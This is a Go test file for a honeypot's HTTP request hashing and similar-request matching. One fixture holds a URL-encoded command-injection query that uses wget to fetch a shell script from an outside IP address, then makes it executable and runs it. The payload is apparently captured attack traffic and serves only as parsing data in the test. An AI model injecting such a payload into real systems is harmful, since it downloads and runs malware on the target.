// Lophiid distributed honeypot
// Copyright (C) 2024 Niels Heinen
//
// This program is free software; you can redistribute it and/or modify it
// under the terms of the GNU General Public License as published by the
// Free Software Foundation; either version 2 of the License, or (at your
// option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
// or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License
// for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
package database

import (
	"lophiid/pkg/database/models"
	"testing"

	"github.com/jackc/pgx/v5/pgtype"
)

func TestHashRequestOk(t *testing.T) {

	for _, test := range []struct {
		description  string
		testRequest  models.Request
		expectedHash string
	}{
		{
			description: "simple request hashes ok",
			testRequest: models.Request{
				Method:  "GET",
				Path:    "/foo",
				Headers: pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				Query:   "aa=bb&cc=dd",
			},
			expectedHash: "5574171b47fbd5919b72e75c59d82220b621b25a1343807870ae8d5d4ec751db",
		},
		{
			description: "parses weird query OK",
			testRequest: models.Request{
				Method:  "GET",
				Path:    "/rssui/public/rssdb_dump.xml",
				Headers: pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				Query:   "path=%22;cd%20%2Fvar%3Bwget%20http%3A%2F%2F45.128.232.229%2Fcgi-dns.sh%3Bchmod%20%2Bx%20cgi-dns.sh%3Bsh%20cgi-dns.sh%22",
			},
			expectedHash: "0b2103a9d4577e2fba8390acc4da751b83708d7048e0b3db68380aca831b2db6",
		},
		{
			description: "simple request hashes ok, different query values, same hash",
			testRequest: models.Request{
				Method:  "GET",
				Path:    "/foo",
				Headers: pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				Query:   "aa=yy&cc=rr",
			},
			expectedHash: "5574171b47fbd5919b72e75c59d82220b621b25a1343807870ae8d5d4ec751db",
		},
		{
			description: "POST request hashes ok",
			testRequest: models.Request{
				Method:      "POST",
				Path:        "/foo",
				Headers:     pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				ContentType: "application/x-www-form-urlencoded",
				Body:        []byte("aa=yy&cc=rr"),
				Query:       "foo=bar",
			},
			expectedHash: "d1c79609eb9124762aca5ea450c13ad9139f100b52742eb22fa7938ea2b73507",
		},
		{
			description: "POST request hashes ok, different body values",
			testRequest: models.Request{
				Method:      "POST",
				Path:        "/foo",
				Headers:     pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				ContentType: "application/x-www-form-urlencoded",
				Body:        []byte("aa=AAAA&cc=XXXX"),
				Query:       "foo=bar",
			},
			expectedHash: "d1c79609eb9124762aca5ea450c13ad9139f100b52742eb22fa7938ea2b73507",
		},
		{
			description: "POST request hashes ok, no query",
			testRequest: models.Request{
				Method:      "POST",
				Path:        "/foo",
				Headers:     pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				ContentType: "application/x-www-form-urlencoded",
				Body:        []byte("aa=AAAA&cc=XXXX"),
				Query:       "",
			},
			expectedHash: "bfba7c50e586a84479576e2bdf673421f80ed0052f79404ef24b0f0509302d0e",
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			sum, err := GetHashFromStaticRequestFields(&test.testRequest)
			if err != nil {
				t.Errorf("unexpected error: %s", err)
			}
			if sum != test.expectedHash {
				t.Errorf("expected sum %s, got %s", test.expectedHash, sum)
			}
		})
	}
}

func TestGetSameRequestHash(t *testing.T) {
	tests := []struct {
		name        string
		req1        models.Request
		req2        models.Request
		shouldMatch bool
		wantErr     bool
	}{
		{
			name: "same request different hosts should match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Host: example1.com", "Accept: application/json"},
				Query:   "id=123",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Host: example2.com", "Accept: application/json"},
				Query:   "id=123",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "different header orders should match",
			req1: models.Request{
				Method:  "POST",
				Path:    "/api/v1/submit",
				Headers: pgtype.FlatArray[string]{"Content-Type: application/json", "Accept: application/json"},
				Query:   "type=user",
			},
			req2: models.Request{
				Method:  "POST",
				Path:    "/api/v1/submit",
				Headers: pgtype.FlatArray[string]{"Accept: application/json", "Content-Type: application/json"},
				Query:   "type=user",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "different query param orders should match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/search",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "q=test&sort=asc",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/search",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "sort=asc&q=test",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "different query case hould match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/search",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "q=test&sort=asc",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/search",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "q=test&Sort=asc",
			},
			shouldMatch: true,
			wantErr:     false,
		},


		{
			name: "form encoded bodies with different orders should match",
			req1: models.Request{
				Method:      "POST",
				Path:       "/submit",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("name=john&age=30"),
				ContentType: "application/x-www-form-urlencoded",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/submit",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("age=30&name=john"),
				ContentType: "application/x-www-form-urlencoded",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "different paths should not match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/api/v1/users",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/api/v1/posts",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
			},
			shouldMatch: false,
			wantErr:     false,
		},
		{
			name: "invalid query parameters should return error",
			req1: models.Request{
				Method:  "GET",
				Path:    "/api",
				Query:   "invalid=%%query",
			},
			req2: models.Request{},
			shouldMatch: false,
			wantErr:     true,
		},
		{
			name: "form encoded bodies with ignored parameters should match regardless of values",
			req1: models.Request{
				Method:      "POST",
				Path:       "/login",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("username=john&password=secret123&remember=true"),
				ContentType: "application/x-www-form-urlencoded",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/login",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("username=alice&password=different456&remember=true"),
				ContentType: "application/x-www-form-urlencoded",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "form encoded bodies with mix of ignored and non-ignored parameters",
			req1: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("username=john&password=secret123&age=25&location=NY"),
				ContentType: "application/x-www-form-urlencoded",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("username=alice&password=different456&age=25&location=NY"),
				ContentType: "application/x-www-form-urlencoded",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "form encoded bodies with mix of ignored and non-ignored parameters should not match with different non-ignored values",
			req1: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("username=john&password=secret123&age=25&location=NY"),
				ContentType: "application/x-www-form-urlencoded",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("username=alice&password=different456&age=30&location=LA"),
				ContentType: "application/x-www-form-urlencoded",
			},
			shouldMatch: false,
			wantErr:     false,
		},
		{
			name: "form encoded bodies with different ignored parameter names should not match",
			req1: models.Request{
				Method:      "POST",
				Path:       "/auth",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("username=john&remember=true"),
				ContentType: "application/x-www-form-urlencoded",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/auth",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("email=john@example.com&remember=true"),
				ContentType: "application/x-www-form-urlencoded",
			},
			shouldMatch: false,
			wantErr:     false,
		},
		{
			name: "form encoded bodies with new underscore parameters should match",
			req1: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("user_name=john&new_password=secret123&remember=true"),
				ContentType: "application/x-www-form-urlencoded",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("user_name=alice&new_password=different456&remember=true"),
				ContentType: "application/x-www-form-urlencoded",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "form encoded bodies with all new underscore variants should match",
			req1: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("new_user=john&new_login=john123&e_mail=john@example.com&new_passwd=secret123"),
				ContentType: "application/x-www-form-urlencoded",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("new_user=alice&new_login=alice123&e_mail=alice@example.com&new_passwd=different456"),
				ContentType: "application/x-www-form-urlencoded",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "form encoded bodies with mixed dash and underscore parameters should match",
			req1: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("new-user=john&new_login=john123&email-address=john@example.com&new_password=secret123"),
				ContentType: "application/x-www-form-urlencoded",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/register",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/x-www-form-urlencoded"},
				Body:       []byte("new-user=alice&new_login=alice123&email-address=alice@example.com&new_password=different456"),
				ContentType: "application/x-www-form-urlencoded",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "non-form encoded bodies should be hashed as-is",
			req1: models.Request{
				Method:      "POST",
				Path:       "/api/data",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/json"},
				Body:       []byte(`{"username":"john","password":"secret123"}`),
				ContentType: "application/json",
			},
			req2: models.Request{
				Method:      "POST",
				Path:       "/api/data",
				Headers:    pgtype.FlatArray[string]{"Content-Type: application/json"},
				Body:       []byte(`{"username":"alice","password":"different456"}`),
				ContentType: "application/json",
			},
			shouldMatch: false,
			wantErr:     false,
		},
		{
			name: "query parameters with ignored values should match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/login",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "username=john&password=secret123&remember=true",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/login",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "username=alice&password=different456&remember=true",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "query parameters with mixed ignored and non-ignored values",
			req1: models.Request{
				Method:  "GET",
				Path:    "/register",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "new_user=john&age=25&location=NY",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/register",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "new_user=alice&age=25&location=NY",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "query parameters with mixed ignored and non-ignored values should not match with different non-ignored values",
			req1: models.Request{
				Method:  "GET",
				Path:    "/register",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "new_user=john&age=25&location=NY",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/register",
				Headers: pgtype.FlatArray[string]{"Accept: application/json"},
				Query:   "new_user=alice&age=30&location=LA",
			},
			shouldMatch: false,
			wantErr:     false,
		},
		{
			name: "same auth type different tokens should match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Authorization: Basic dXNlcjE6cGFzczE="},
				Query:   "id=123",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Authorization: Basic dXNlcjI6cGFzczI="},
				Query:   "id=123",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "different auth types should not match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Authorization: Basic dXNlcjE6cGFzczE="},
				Query:   "id=123",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9"},
				Query:   "id=123",
			},
			shouldMatch: false,
			wantErr:     false,
		},
		{
			name: "malformed auth header should be ignored",
			req1: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Authorization:BasicWithNoSpace"},
				Query:   "id=123",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Authorization: Basic dXNlcjE6cGFzczE="},
				Query:   "id=123",
			},
			shouldMatch: false,
			wantErr:     false,
		},
		{
			name: "same request different referer headers should match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Referer: https://example1.com/page", "Accept: application/json"},
				Query:   "id=123",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"Referer: https://example2.com/different", "Accept: application/json"},
				Query:   "id=123",
			},
			shouldMatch: true,
			wantErr:     false,
		},
		{
			name: "same request different user-agent headers should match",
			req1: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept: application/json"},
				Query:   "id=123",
			},
			req2: models.Request{
				Method:  "GET",
				Path:    "/api/v1/data",
				Headers: pgtype.FlatArray[string]{"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Accept: application/json"},
				Query:   "id=123",
			},
			shouldMatch: true,
			wantErr:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hash1, err1 := GetSameRequestHash(&tt.req1)
			if (err1 != nil) != tt.wantErr {
				t.Errorf("GetSameRequestHash() error = %v, wantErr %v", err1, tt.wantErr)
				return
			}

			if tt.wantErr {
				return
			}

			hash2, err2 := GetSameRequestHash(&tt.req2)
			if err2 != nil {
				t.Errorf("GetSameRequestHash() unexpected error = %v", err2)
				return
			}

			if tt.shouldMatch && hash1 != hash2 {
				t.Errorf("Hashes should match but don't: hash1=%v, hash2=%v", hash1, hash2)
			}
			if !tt.shouldMatch && hash1 == hash2 {
				t.Errorf("Hashes should not match but do: hash1=%v", hash1)
			}
		})
	}
}
